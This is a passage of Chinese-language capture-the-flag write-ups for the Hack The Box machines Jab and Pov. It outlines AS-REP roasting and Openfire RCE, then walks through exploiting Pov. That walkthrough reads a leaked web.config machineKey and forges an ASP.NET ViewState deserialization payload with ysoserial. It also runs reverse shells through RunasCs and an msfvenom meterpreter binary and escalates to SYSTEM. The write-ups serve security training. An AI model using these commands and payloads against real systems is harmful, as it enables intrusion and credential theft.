# [HTB]Jab #DCOM #AS-REP
- **初始侦察**：使用**nmap**扫描发现开放端口88、445和5222。
- **SMB尝试**：尝试使用**smbclient**和**crackmapexec**检查共享文件夹，但遇到错误。
- **Jabber/XMPP服务**：发现运行着**Jabber**和**XMPP**聊天服务。
- **Pidgin客户端**：通过**Pidgin**客户端连接到XMPP服务并注册账户。
- **用户搜索**：利用Pidgin的用户搜索功能，通过输入星号(*)进行高级搜索，获取用户列表。
- **AS-REP Roasting**：使用**Impacket**工具中的**GetNPUsers.py**进行AS-REP Roasting获取用户哈希。***\*None PreAuth Users***
- **密码破解**：使用**john**或**hashcat**结合**rockyou.txt**字典文件破解哈希。
- **远程连接**：使用获取的凭证通过**dcomexec.py**工具建立远程连接。***\*DCOM组件利用***
- **漏洞利用**：利用CVE-2023–32315漏洞，通过上传恶意**.jar**文件到Openfire admin console实现远程代码执行（RCE）。
- **端口转发**：使用**Chisel**设置端口转发以访问本地端口9090和9091。***\*Chisel的使用***
- **获取根权限**：通过Openfire admin console的RCE获取系统（root）权限，并查看root.txt文件。
# [HTB]Pov #\.Net反序列化
```Credential
alaading
f8gQ8fynP44ek1m3
```
## Enumeration and Analysis 枚举和分析

### Nmap
让我们使用以下命令运行一个简单的 Nmap 扫描：
```bash
nmap -sC -sV IP
```

### Directory Enumeration 目录枚举
让我们使用以下命令进行目录枚举：
```bash
dirsearch -u clicker.htb -e*
```
或者
```bash
gobuster dir -u http://pov.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
我们没有发现任何有趣的东西。

### Subdomain Enumeration 子域枚举
让我们使用以下命令执行 DNS 枚举：
```bash
gobuster dns -d clicker.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
```
但是我们在扫描中没有发现任何有趣的东西。

## Initial Foothold 初始立足点

### Port — 80 端口 — 80
在枚举 http://pov.htb 时，我们在页脚中找到了用户名和子域 http://dev.pov.htb 。

让我们将其添加到主机并检查它。此外，在 http://dev.pov.htb 上，还有一个文件下载选项。

Upon intercepting that request, we can see a list of parameters like below:

```plaintext
__EVENTTARGET=download&
__EVENTARGUMENT=&
__VIEWSTATE=DY%2FikU7FyXJZCW0op4Kz6Bgqd4o%2FFtEfEsiowrOTlRKwk96TfCKJt6cwtTy82KRl93H2SNf4FCvmzZuhMaKfKMCbzZg%3D&
__VIEWSTATEGENERATOR=8E0F0FA3&
__EVENTVALIDATION=eGOIJz%2BJA4RbAfYNdIjP%2FXmYDtUaz97UabMUsYu%2Bg8ppRuevK%2FWEufVY9E0M8KqssT57LzrVSlgu%2FzTmjoojoiS270xt9sBSLasZ2CSk2sh4uF3oBk9hMWE%2FILb9D20b1kQDEA%3D%3D
&file=cv.pdf
```

我们可以尝试将文件名从“cv.pdf”更改为另一个敏感文件名。当我们将文件名更改为“/web.config”时，我们会收到以下响应：

```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

## User.txt 用户文档

经过研究，我找到了一种利用这个漏洞的方法。

首先，我们需要使用以下命令创建有效负载：

```bash
python3 Reverse_Shell_for_Power_Shell.py IP 4444
```

打开 Windows 虚拟机，从 [链接] 下载ysoserial.exe，使用命令提示符导航到该文件夹，按以下语法粘贴有效负载，然后按 Enter。

```plaintext
ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" -c "Paste_the_payload_here"
```

现在，单击 http://dev.pov.htb 上的“下载简历”按钮，捕获请求，粘贴我们之前为“__VIEWSTATE”参数创建的代码，然后发送请求。

如果您正确完成了所有操作，您将收到一个连接。

我们现在处于“sfitz”的外壳中。我在 sfitz 的 Documents 文件夹中发现了一个有趣的文件，其中包含特权用户“alaading”的密码。

使用以下命令获取该密码：

```plaintext
echo > pass.txt
$EncryptedString = Get-Content .\pass.txt
$SecureString = ConvertTo-SecureString $EncryptedString
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
echo $Credential.GetNetworkCredential().password
```

下载“RunasCs.exe”，“psgetsys.ps1”和“EnableAllTokenPrivs.ps1”。

打开下载文件夹中的终端，然后键入以下命令以启动HTTP服务器，以将文件从我们的机器传输到Windows：

```bash
python3 -m http.server
```

该文件的链接类似于 http：//YOUR_IP：8000/filename。现在，使用以下命令在受害计算机上下载文件：

```plaintext
certutil.exe -

urlcache -split -f "http://IP:8000/EnableAllTokenPrivs.ps1" ".\EnableAllTokenPrivs.ps1"
certutil.exe -urlcache -split -f "http://IP:8000/psgetsys.ps1" ".\psgetsys.ps1"
certutil.exe -urlcache -split -f "http://IP:8000/RunasCs.exe" ".\RunasCs.exe"
```

现在，在您的计算机上启动侦听器，并在受害计算机上键入以下命令，以使用提供的凭据访问 Alaading 的帐户：

```plaintext
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r YOUR_IP:4444
```

使用以下命令查看标志或手动将目录更改为 alaading 的目录：

```plaintext
type C:\Users\alaading\Desktop\user.txt
```

## Privilege Escalation 权限提升

如果我们键入“whoami /priv”，我们可以看到“sedebugPrivilegePoC”权限已被禁用。若要启用此权限的状态，请导航到目录并使用以下命令执行我们在上一节中下载的脚本：

```plaintext
.\psgetsys.ps1
.\EnableAllTokenPrivs.ps1
```

在计算机上，使用以下命令创建 Windows 有效负载：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -f exe > exploit.exe
```

将“exploit.exe”移动到我们托管 HTTP 服务器的目录，并使用上述技术将文件发送到受害计算机。在您的机器上配置 Meterpreter，并在受害机器上运行“exploit.exe”。

键入“ps”并找到“winlogon.exe”的 PID。然后键入“migrate PID_VALUE”，然后键入“shell”。现在，您可以以“nt authority\system”的身份访问。

使用以下命令查看标志或手动将目录更改为管理员的目录：

```plaintext
type C:\Users\Administrator\Desktop\root.txt
```

我们已获得管理员标志。